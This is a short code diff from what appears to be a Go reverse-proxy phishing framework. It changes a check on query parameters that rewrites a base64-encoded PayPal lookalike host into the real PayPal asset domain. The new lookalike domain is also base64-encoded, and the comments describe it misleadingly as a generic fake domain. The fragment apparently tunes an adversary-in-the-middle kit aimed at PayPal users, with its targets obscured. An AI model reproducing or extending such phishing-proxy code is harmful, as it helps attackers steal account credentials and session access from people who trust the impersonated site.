@@ -770,7 +770,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-							if qs[gp][i] == "aHR0cHM6Ly9wYXlwYWxvYmplY3RzLndvcmtmaWxlLnRlY2g6NDQz" { // https://accounts.fake-domain.com:443
+							if qs[gp][i] == "aHR0cHM6Ly9wYXlwYWxvYmplY3RzLnBheXBhbC13ZWIuY29tOjQ0Mw.." { // https://accounts.fake-domain.com:443
 								qs[gp][i] = "aHR0cHM6Ly93d3cucGF5cGFsb2JqZWN0cy5jb206NDQz" // https://accounts.safe-domain.com:443
 							}
 							}
